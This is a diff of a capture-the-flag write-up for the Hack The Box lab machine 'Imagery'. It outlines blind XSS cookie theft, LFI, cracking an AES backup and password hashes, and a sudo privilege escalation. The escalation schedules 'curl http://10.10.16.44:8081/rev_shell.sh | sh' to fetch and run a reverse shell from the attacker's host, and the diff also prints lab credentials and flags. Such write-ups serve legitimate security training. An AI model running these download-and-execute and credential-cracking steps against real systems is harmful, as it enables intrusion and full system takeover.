@@ -3,6 +3,11 @@ layout: default
 title: Imagery
 ---
 
+## TL;DR
+
+We use blind XSS Injection to steal admin session cookie, and then exploiting LFI to achieve source code. From there we crack the password of `testuser`, and find `RCE` in `api_edit`, which let us gain a shell on `web` user.
+We find backup aes encrypted zip, we crack it and find the hash of `mark`'s password, which we crack. Then we exploit `/usr/local/bin/charcol` to achieve PE and get root shell.
+
 ### Recon
 
 we start with `nmap`, using this command, i was needed to add `-Pn`, because otherwise `nmap` thinks the host is down:
@@ -427,11 +432,180 @@ Here you can see the reverse shell i got.
 
 ![get reverse shell penelope](image-15.png)
 
-### Escalate from user web to user mark 
+### Find backup encryption, brute force the encryption and then crack mark credentials
+
+We can notice inside the folder `/bot` the file `admin.py`, which contains these lines:
+```py
+# ----- Config -----
+CHROME_BINARY = "/usr/bin/google-chrome"
+USERNAME = "admin@imagery.htb"
+PASSWORD = "strongsandofbeach"
+BYPASS_TOKEN = "K7Zg9vB$24NmW!q8xR0p%tL!"
+APP_URL = "http://0.0.0.0:8000"
+# ------------------
+```
+
+So, the username `admin@imagery.htb` has the password `strongsandofbeach`.
+
+Next, I used `peass-ng`. If we use `penelope`, we can easily press `F12`, and by this way detached from the session. Then, we just execute `run peass_ng`, and this will get execute on different window.
+We can return back to the session by typing `interact`.
+
+In this "other Interesting files" we can find `/usr/local/bin/pyAesCrypt`.
+
+![interesting files](image-16.png)
+
+In addition, we can find interesting backup folder.
+```bash
+drwxr-xr-x 2 root root 4096 Sep 22 18:56 /var/backup
+total 22516
+-rw-rw-r-- 1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes
+```
+
+![backup folders peass-ng](image-17.png)
+
+We can see here it was encrypted using `pyAesCrypt`.
+
+![xxd head](image-18.png)
+
+I found this script on the machine using the `find` command, and then tried  to decrypt this with both password, however nothing works.
+```bash
+web@Imagery:/tmp/my_back$ python3 pyAesCrypt web_20250806_120723.zip.aes -o web_20250806_120723.zip -d -p strongsandofbeach
+Warning: passing passwords as plaintext command-line arguments may be unsafe.
+Wrong password (or file is corrupted).
+web@Imagery:/tmp/my_back$ python3 pyAesCrypt web_20250806_120723.zip.aes -o web_20250806_120723.zip -d -p iambatman
+Warning: passing passwords as plaintext command-line arguments may be unsafe.
+Wrong password (or file is corrupted).
+```
+
+That's means we need to brute force.
+After struggling with ChatGPT, I managed to write brute force script in python that uses the `pyAesCrypt` module
+
+```py
+{% include_relative brute_force_zip_aes.py %}
+```
+
+First, we need to make venv, and then activate and install the package `pyAesCrypt`.
+```bash
+┌──(agonen㉿kali)-[~/htb/Imagery]
+└─$ python3 -m venv .venv                                                        
+                                                                                                                                                                                        
+┌──(agonen㉿kali)-[~/htb/Imagery]
+└─$ source .venv/bin/activate
+                                                                                                                                                                                        
+┌──(.venv)─(agonen㉿kali)-[~/htb/Imagery]
+└─$ pip install pyAesCrypt     
+```
+
+Then, we can brute force using the `rockyou.txt` wordlist.
+```bash
+┌──(.venv)─(agonen㉿kali)-[~/htb/Imagery]
+└─$ python3 crack.py web_20250806_120723.zip.aes /usr/share/wordlists/rockyou.txt
+Starting attempts on 'web_20250806_120723.zip.aes' using wordlist '/usr/share/wordlists/rockyou.txt' (14344392 candidates)...
+Attempted 100/14344392 passwords... (elapsed 1.5s)
+Attempted 200/14344392 passwords... (elapsed 2.9s)
+Attempted 300/14344392 passwords... (elapsed 4.4s)
+Attempted 400/14344392 passwords... (elapsed 5.9s)
+Attempted 500/14344392 passwords... (elapsed 7.3s)
+Attempted 600/14344392 passwords... (elapsed 8.8s)
+
+SUCCESS! Password found: 'bestfriends'
+Decrypted file written to: /tmp/aes_recover_dwijsht4
+Attempts: 670, Time elapsed: 9.9s
+If you want, move the file to a permanent location and inspect.
+```
+
+We can check with `pyAesCrypt` the password `bestfriends` is the real password:
+```bash
+┌──(.venv)─(agonen㉿kali)-[~/htb/Imagery]
+└─$ pyAesCrypt -o decrypt.zip -p bestfriends -d web_20250806_120723.zip.aes 
+Warning: passing passwords as plaintext command-line arguments may be unsafe.
+                                                                                                                                                                                    
+┌──(.venv)─(agonen㉿kali)-[~/htb/Imagery]
+└─$ ls
+admin@imagery.htb.log  crack.py  decrypt.zip  pyAesCrypt  rev_shell.sh  web_20250806_120723.zip.aes
+
+┌──(.venv)─(agonen㉿kali)-[~/htb/Imagery]
+└─$ unzip decrypt.zip -d decrypt/              
+```
+
+Now we go back to `db.json`:
+```json
+{
+    "username": "mark@imagery.htb",
+    "password": "01c3d2e5bdaf6134cec0a367cf53e535",
+    "displayId": "868facaf",
+    "isAdmin": false,
+    "failed_login_attempts": 0,
+    "locked_until": null,
+    "isTestuser": false
+},
+{
+    "username": "web@imagery.htb",
+    "password": "84e3c804cf1fa14306f26f9f3da177e0",
+    "displayId": "7be291d4",
+    "isAdmin": true,
+    "failed_login_attempts": 0,
+    "locked_until": null,
+    "isTestuser": false
+}
+```
+
+Let's crack them using [https://crackstation.net/](https://crackstation.net/).
+
+![crack passwords 2](image-19.png)
+
+mark's password is `supersmash`
+```bash
+01c3d2e5bdaf6134cec0a367cf53e535:supersmash
+84e3c804cf1fa14306f26f9f3da177e0:spiderweb1234
+```
+
+we need to connect back to `web`, and then `su` to `mark` using the password `supersmash`:
+```bash
+web@Imagery:~/web$ su mark
+Password: 
+mark@Imagery:/home/web/web$ cat ~/user.txt 
+05faa9953aa5ebe82391dc1f700088df
+```
 
 ### Privilege Escalation to Root
 
+When executing `sudo -l`, we can execute `/usr/local/bin/charcol` with no password.
 
-**User Flag:*****`b40abdfe23665f766f9c61ecba8a4c19`***
+```bash
+ark@Imagery:~$ sudo -l
+Matching Defaults entries for mark on Imagery:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
-**Root Flag:*****`b40abdfe23665f766f9c61ecba8a4c19`***
+User mark may run the following commands on Imagery:
+    (ALL) NOPASSWD: /usr/local/bin/charcol
+```
+
+So, first:
+```bash
+sudo /usr/local/bin/charcol shell
+``` 
+then, we can add scheduald command, we'll use the same payload we used in the beginning:
+```bash
+auto add --schedule "* * * * *" --name "GIVE ME ROOT SHELL" --command "curl http://10.10.16.44:8081/rev_shell.sh | sh"
+```
+
+Now just wait for the miracle to happen, here you can see the remote server asking from my local machine for `rev_shell.sh`
+![get shell.sh](image-21.png)
+
+And here i got the root shell.
+
+![get root shell](image-20.png)
+
+Now, let's get the root flag:
+
+![get root flag](image-22.png)
+
+```bash
+root@Imagery:~# cat /root/root.txt
+a49171570e5551035469fd317cef4897
+```
+
+**User Flag:*****`05faa9953aa5ebe82391dc1f700088df`***
+
+**Root Flag:*****`a49171570e5551035469fd317cef4897`***
